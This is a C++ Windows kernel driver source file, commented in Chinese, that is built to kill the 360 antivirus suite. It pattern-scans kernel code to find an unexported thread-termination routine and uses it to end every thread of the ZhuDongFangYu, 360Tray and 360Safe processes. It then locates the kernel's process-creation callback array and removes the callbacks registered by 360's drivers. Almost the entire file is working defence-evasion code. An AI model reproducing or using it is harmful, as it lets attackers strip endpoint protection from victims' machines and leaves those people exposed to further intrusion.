/// kill 3x0
/// 学(抄)习(袭)、总结自各种资料
#pragma once
extern "C" {
#include <wdm.h>
}

#define DBG_ING 1
#ifdef DBG_ING	
#define DBgPrint_ /\
/
#endif


// unload
NTSTATUS DriverUnload(IN struct _DRIVER_OBJECT *pDri) {
	return STATUS_SUCCESS;
}

namespace rush_duck_version {


#define WINXP						510
#define WINXP2600					5102600

#define WIN7						61
#define WIN7_7600					6107600
#define WIN7_7601					6107601

#define	WIN8						62
#define	WIN89200					6209200

#define WIN8_1						63
#define	WIN8_1_9600					6309600

#define WIN10						100
#define WIN10_1507_10240			10010240
#define WIN10_1511_10586			10010586
#define WIN10_1607_14393			10014393
#define WIN10_1703_15063			10015063
#define WIN10_1709_16299			10016299
#define WIN10_1803_17134			10017134
#define WIN10_1809_17763			10017763
#define WIN10_1903_18323 			10018323 

#define MyGetBigVersion(OsVersionNumber) ((OsVersionNumber)/100'000)

	inline LONG MyGetVersion() {
		NTSTATUS status = 0;
		ULONG    major = 0;
		ULONG    minor = 0;
		ULONG    buildNumber = 0;
		RTL_OSVERSIONINFOW versionInformation = { 0 };
		ULONG osVersion;

		versionInformation.dwOSVersionInfoSize = sizeof(RTL_OSVERSIONINFOW);

		status = RtlGetVersion(&versionInformation);
		if (!NT_SUCCESS(status)) {
			return -1;
		}

		major = versionInformation.dwMajorVersion;
		minor = versionInformation.dwMinorVersion;
		buildNumber = versionInformation.dwBuildNumber;
		if (major == 5 && minor == 1 && buildNumber == 2600) {
			osVersion = WINXP2600;
		}
		else if (major == 5 && minor == 1) {
			osVersion = WINXP;
		}
		else if (major == 6 && minor == 1 && buildNumber == 7601) {
			osVersion = WIN7_7601;
		}
		else if (major == 6 && minor == 1 && buildNumber == 7600) {
			osVersion = WIN7_7600;
		}
		else if (major == 6 && minor == 1) {
			osVersion = WIN7;
		}
		else if (major == 6 && minor == 2 && buildNumber == 9200) {
			osVersion = WIN89200;
		}
		else if (major == 6 && minor == 2) {
			osVersion = WIN8;
		}
		else if (major == 6 && minor == 3 && buildNumber == 9600) {
			osVersion = WIN8_1_9600;
		}
		else if (major == 6 && minor == 3) {
			osVersion = WIN8_1;
		}
		else if (major == 10 && minor == 0 && buildNumber == 10240) {
			osVersion = WIN10_1507_10240;
		}
		else if (major == 10 && minor == 0 && buildNumber == 10586) {
			osVersion = WIN10_1511_10586;
		}
		else if (major == 10 && minor == 0 && buildNumber == 14393) {
			osVersion = WIN10_1607_14393;
		}
		else if (major == 10 && minor == 0 && buildNumber == 15063) {
			osVersion = WIN10_1703_15063;
		}
		else if (major == 10 && minor == 0 && buildNumber == 15063) {
			osVersion = WIN10_1709_16299;
		}
		else if (major == 10 && minor == 0 && buildNumber == 15063) {
			osVersion = WIN10_1803_17134;
		}
		else if (major == 10 && minor == 0 && buildNumber == 15063) {
			osVersion = WIN10_1903_18323;
		}
		else if (major == 10 && minor == 0) {
			osVersion = WIN10;
		}
		else {
			return -2;
		}
		DbgPrint("osVersion is:%d \n", osVersion);
		return osVersion;
	}
}

namespace rush_duck_pass {
	#define KILL_PROC_CNT	3
	CHAR killName[KILL_PROC_CNT][24] = { "ZhuDongFangYu","360Tray","360Safe" };

	typedef NTSTATUS(__fastcall *PS_TERMINATE_THREAD_BY_POINTER)(IN PETHREAD Thread, IN NTSTATUS ExitStatus, IN BOOLEAN DirectTerminate);
	EXTERN_C CHAR* PsGetProcessImageFileName(IN PEPROCESS Process);
	USHORT killNameLen[KILL_PROC_CNT]{ 0 };
	UCHAR	Win7_Feature[] = { 0x01,0xE8 };
	UCHAR	Win10_Feature[] = { 0x01,0xE9 };

	inline UCHAR* SearchAddrByFeature(UCHAR* baseAddr, UCHAR* feature, USHORT featureLen, ULONG maxSearchNumber = 0xFF) {
		ULONG i = 0;
		ULONG len = featureLen;
		for (; i < maxSearchNumber; ++i) {
			ULONG j = 0;
			for (; j < len; ++j) {
				if (*(baseAddr + i + j) != *(feature + j)) {
					break;
				}
			}
			if (j == len) {
				break;
			}
		}
		if (i == maxSearchNumber + 1) {
			return NULL;
		}
		return baseAddr + i;
	}

	inline PCHAR GetProcessNameByProcessId(HANDLE ProcessId) {
		PEPROCESS ProcessObj = NULL;
		PCHAR StringName = NULL;
		NTSTATUS Status = STATUS_UNSUCCESSFUL;
		Status = PsLookupProcessByProcessId(ProcessId, &ProcessObj);
		if (NT_SUCCESS(Status)) {
			StringName = (PCHAR)PsGetProcessImageFileName(ProcessObj);
			ObfDereferenceObject(ProcessObj);
		}
		return StringName;
	}

	ULONG gVersion = 0;
	inline PUCHAR Get_PsTerminateSystemThread_Addr() {
		UNICODE_STRING funcName = RTL_CONSTANT_STRING(L"PsTerminateSystemThread");
		UCHAR* baseAddr = (UCHAR*)MmGetSystemRoutineAddress(&funcName);

		gVersion = MyGetBigVersion(rush_duck_version::MyGetVersion());
		UCHAR *feature = NULL;
		//DbgPrint("big gVersion is:%d \n", gVersion);
		if (gVersion == WIN7) {
			feature = Win7_Feature;
			DbgPrint("Winsows 7 \n");
		}
		else if (gVersion == WIN10) {
			feature = Win10_Feature;
			DbgPrint("Windows 10\n");
		}
		else {
			DbgPrint("Vsrsion Not Soupport \n");
			return NULL;
		}
		baseAddr = SearchAddrByFeature(baseAddr, feature, 2);
		baseAddr = baseAddr + 1;
		UINT32 operatNum = *(UINT32*)(baseAddr + 1);
		baseAddr = baseAddr + 5 + operatNum;
		return baseAddr;
	}

	inline NTSTATUS Pass3X0() {
		NTSTATUS status = STATUS_UNSUCCESSFUL;

		PS_TERMINATE_THREAD_BY_POINTER killFuncPtr = (PS_TERMINATE_THREAD_BY_POINTER)Get_PsTerminateSystemThread_Addr();
		if (killFuncPtr == NULL) {
			return STATUS_NOT_SUPPORTED;
		}

		// 搜进程
		for (ULONG i = 0; i < KILL_PROC_CNT; ++i) {
			killNameLen[i] = strlen(killName[i]);
		}
		PEPROCESS pKillProcess[KILL_PROC_CNT] = { NULL };
		BOOLEAN isFind[KILL_PROC_CNT] = { FALSE };
		PCHAR currentProcName = NULL;
		for (ULONG j = 0; j < 0x10'000; j += 4) {
			CHAR szProcName[24] = { 0 };
			currentProcName = GetProcessNameByProcessId((HANDLE)j);
			if (currentProcName != NULL) {
				strcpy(szProcName, currentProcName);
			}
			BOOLEAN isFindAll = TRUE;
			for (ULONG t = 0; t < KILL_PROC_CNT; ++t) {
				isFindAll = isFindAll && isFind[t];
				if (!isFind[t] && !strncmp(szProcName, killName[t], killNameLen[t])) {
					isFind[t] = TRUE;
					PsLookupProcessByProcessId((HANDLE)j, &pKillProcess[t]);
					DbgPrint("find proc,pid is:%d,name is:%s", j, szProcName);
				}
			}
			if (isFindAll) {
				break;
			}
		}

		// 搜线程
		PETHREAD pThread = NULL;
		PEPROCESS pProcess = NULL;
		for (ULONG k = 0; k < 0x40'000; k += 4) {
			status = PsLookupThreadByThreadId((HANDLE)k, &pThread);
			if (NT_SUCCESS(status)) {
				pProcess = IoThreadToProcess(pThread);
				for (ULONG r = 0; r < KILL_PROC_CNT; ++r) {
					if (pKillProcess[r] != NULL && pKillProcess[r] == pProcess) {
						status = killFuncPtr(pThread, STATUS_SUCCESS, TRUE);
					}
				}
				ObDereferenceObject(pThread);
			}
		}

		// 解引用
		for (ULONG s = 0; s < KILL_PROC_CNT; ++s) {
			if (pKillProcess[s] != NULL) {
				ObDereferenceObject(pKillProcess[s]);
				pKillProcess[s] = NULL;
			}
		}
		return STATUS_SUCCESS;
	}
}

namespace rush_duck_enum {
	UCHAR Proc_Arr_Win7_Feature[] = { 0x4c,0x8d,0x35 };
	UCHAR Proc_Arr_Win10_Feature[] = { 0x4c,0x8d,0x3d };

	UCHAR pspCreateFuncCommonFeature[] = { 0xE9 };
	typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY {
		ULONG Unkonw1;
		ULONG Unkonw2;
		ULONG Unkonw3;
		ULONG Unkonw4;
		PVOID Base;
		ULONG Size;
		ULONG Flags;
		USHORT Index;
		USHORT NameLength;
		USHORT LoadCount;
		USHORT ModuleNameOffset;
		CHAR ImageName[256];
	}SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;

	typedef struct _SYSTME_MODULE_INFORMATION {
		ULONG ModuleCount;
		SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
	}SYSTME_MODULE_INFORMATION, *PSYSTME_MODULE_INFORMATION;

	typedef enum _SYSTEM_INFORMATION_CLASS {
		SystemBasicInformation,			//0
		SystemProcessorInformation,		//1
		SystemPerformanceInformation,	//2
		SystemTimeOfDayInformation,		//3
		SystemPathInformation,			//4
		SystemProcessInformation,		//5 进程信息
		SystemCallCountInformation,
		SystemDeviceInformation,
		SystemProcessorPerformanceInformation,
		SystemFlagsInformation,
		SystemCallTimeInformation,		//10
		SystemModuleInformation,		// 11 模块信息
		SystemLocksInformation,
		SystemStackTraceInformation,
		SystemPagedPoolInformation,
		SystemNonPagedPoolInformation,
		SystemHandleInformation,
		SystemObjectInformation,
		SystemPageFileInformation,
		SystemVdmInstemulInformation,
		SystemVdmBopInformation,		//20
		SystemFileCacheInformation,
		SystemPoolTagInformation,
		SystemInterruptInformation,
		SystemDpcBehaviorInformation,
		SystemFullMemoryInformation,
		SystemLoadGdiDriverInformation,
		SystemUnloadGdiDriverInformation,
		SystemTimeAdjustmentInformation,
		SystemSummaryMemoryInformation,
		SystemNextEventIdInformation,	//30
		SystemEventIdsInformation,
		SystemCrashDumpInformation,
		SystemExceptionInformation,
		SystemCrashDumpStateInformation,
		SystemKernelDebuggerInformation,
		SystemContextSwitchInformation,
		SystemRegistryQuotaInformation,
		SystemExtendServiceTableInformation,
		SystemPrioritySeperation,
		SystemPlugPlayBusInformation,	//40
		SystemDockInformation,
		SystemPowerInformation2,
		SystemProcessorSpeedInformation,
		SystemCurrentTimeZoneInformation,
		SystemLookasideInformation
	} SYSTEM_INFORMATION_CLASS, *PSYSTEM_INFORMATION_CLASS;
	EXTERN_C NTSYSAPI NTSTATUS NTAPI ZwQuerySystemInformation(
		IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
		OUT PVOID SYstemINformation,
		IN ULONG SYstemInformationLength,
		OUT PULONG ReturnLength OPTIONAL
	);

	typedef struct __MY_SIMPLE_SYS_INFORMATION {
		ULONG64 start;
		ULONG64 end;
	}MY_SIMPLE_SYS_INFORMATION, *PMY_SIMPLE_SYS_INFORMATION;

	MY_SIMPLE_SYS_INFORMATION gFindSys[30] = { 0 };
	USHORT gFindIndex = 0;
	inline BOOLEAN Find3X0Module() {
		// 似乎win10不会出现回调卡进程的情况，就不处理了
		if (rush_duck_pass::gVersion == WIN10) {
			return FALSE;
		}
		CHAR findCh[] = "360";
		ULONG needSize, i, moduleCount, bufferSize = 0x5'000;
		BOOLEAN isFind = FALSE;
		PVOID pBuffer = NULL;
		PCHAR pDrvName = NULL;
		NTSTATUS status;
		PSYSTME_MODULE_INFORMATION pSMI;
		do {
			pBuffer = ExAllocatePoolWithTag(PagedPool, bufferSize, 'enum');
			if (pBuffer == NULL) {
				return FALSE;
			}
			status = ZwQuerySystemInformation(SystemModuleInformation, pBuffer, bufferSize, &needSize);
			if (status == 0xC000'0004) {
				ExFreePool(pBuffer);
				bufferSize *= 2;
			}
			else if (!NT_SUCCESS(status)) {
				ExFreePool(pBuffer);
				return FALSE;
			}
		} while (status == 0xC000'0004);
		pSMI = (PSYSTME_MODULE_INFORMATION)pBuffer;
		moduleCount = pSMI->ModuleCount;
		for (i = 0; i < moduleCount; ++i) {
			if ((ULONG64)pSMI->Module[i].Base > (ULONG64)0x8000'0000'0000'0000) {
				pDrvName = pSMI->Module[i].ImageName + pSMI->Module[i].ModuleNameOffset;
			}
			//DbgPrint("start:0x%p \t end:0x%p \t %s \n", (ULONG64)pSMI->Module[i].Base, (ULONG64)pSMI->Module[i].Base + pSMI->Module[i].Size, pDrvName);
			if (strncmp(pDrvName, findCh, 3) == 0) {
				gFindSys[gFindIndex].start = (ULONG64)pSMI->Module[i].Base;
				gFindSys[gFindIndex++].end = (ULONG64)pSMI->Module[i].Base + pSMI->Module[i].Size;
				isFind = TRUE;
			}
		}
		if (!isFind) {
			DbgPrint("Not Find \n");
		}
		ExFreePool(pBuffer);
		return isFind;
	}

	/////////////////////////////////////////////////////
	// remove proc notify
	// 不处理这个可能打不开进程
	inline PUCHAR Find_PspCreateProcessNotifyRoutine_Arr() {
		LONG OffsetAddr = 0;
		PUCHAR pCheckArea = NULL;
		UNICODE_STRING unstrFunc;
		// PsSet* addr
		RtlInitUnicodeString(&unstrFunc, L"PsSetCreateProcessNotifyRoutine");
		pCheckArea = (PUCHAR)MmGetSystemRoutineAddress(&unstrFunc);
		// PspSet* addr
		pCheckArea = rush_duck_pass::SearchAddrByFeature(pCheckArea, pspCreateFuncCommonFeature, 1);
		if (pCheckArea == NULL) {
			return NULL;
		}
		ULONG asmByte = 5;
		ULONG opreateNumber = *(PULONG)(pCheckArea + 1); 
		// 这里的跳转，需要丢弃低32位的进位，因为opreateNumber其实是解释成有符号的
		auto calcJumpAddrFunc = [=](ULONG asmByte, ULONG opreateNumber)-> PUCHAR {
			return (PUCHAR)(((ULONG64)pCheckArea & 0xFFFF'FFFF'0000'0000) + (ULONG32)((ULONG32)pCheckArea + asmByte + opreateNumber));
		};
		pCheckArea = calcJumpAddrFunc(asmByte, opreateNumber);
		//DbgPrint("PspSetCreateProcessNotifyRoutine:%p", pCheckArea);

		// PspCreate* Arr addr
		UCHAR* feature = Proc_Arr_Win7_Feature;
		pCheckArea = rush_duck_pass::SearchAddrByFeature(pCheckArea, feature, 3);
		asmByte = 7;
		opreateNumber = *((PULONG32)(pCheckArea + 3));
		return calcJumpAddrFunc(asmByte, opreateNumber);
	}

	inline NTSTATUS RemoveProcessNotify() {
		ULONG64 notifyAddr = NULL, magicPtr = NULL;
		PUCHAR pArr = Find_PspCreateProcessNotifyRoutine_Arr();
		if (pArr == NULL) {
			return STATUS_UNSUCCESSFUL;
		}
		ULONG i = 0;
		for (; i < 64; ++i) {
			magicPtr = (ULONG64)pArr + i * 8;
			notifyAddr = (ULONG64)(*(PULONG64)magicPtr);
			if (notifyAddr != NULL && MmIsAddressValid((PVOID)notifyAddr)) {
				notifyAddr = (ULONG64)(*(PULONG64)((ULONG64)notifyAddr & 0xFFFF'FFFF'FFFF'FFF8)); // 解密
				//DbgPrint("process callback is:%p", notifyAddr);
				for (ULONG i = 0; i < gFindIndex; ++i) {
					if (notifyAddr >= gFindSys[i].start && notifyAddr <= gFindSys[i].end) {
						DbgPrint("360 process callback is:%p", notifyAddr);
						PsSetCreateProcessNotifyRoutine((PCREATE_PROCESS_NOTIFY_ROUTINE)notifyAddr, TRUE);
					}
				}
			}
		}
		return STATUS_SUCCESS;
	}
}